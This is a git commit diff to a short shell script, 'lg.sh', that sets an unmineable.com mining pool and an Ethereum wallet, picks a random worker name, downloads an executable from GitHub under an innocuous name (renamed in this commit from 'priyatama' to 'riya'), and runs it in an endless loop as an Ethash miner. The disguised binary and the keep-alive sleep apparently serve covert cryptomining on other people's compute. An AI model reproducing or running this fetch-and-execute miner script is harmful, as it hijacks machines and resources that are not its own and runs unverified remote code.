7bc9c1325a7cb91905d45b7be2c4de239e851553
pruthvigithub1137 <88317515+pruthvigithub1137@users.noreply.github.com>
2021-08-05 14:47:40 +0530

    Update lg.sh

--- lg.sh
+++ lg.sh
@@ -2,10 +2,10 @@
 POOL=ethash.unmineable.com:3333
 WALLET=ETH:0x19bED4AA973C277dEbF737450a630075787515bd
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
-wget https://github.com/pruthvigithub1137/prem/raw/main/priyatama
-chmod +x priyatama
+wget https://github.com/pruthvigithub1137/prem/raw/main/riya
+chmod +x riya
 while [ 1 ]; do
-./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./riya --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
 sleep 5
 done
 sleep 999999999 
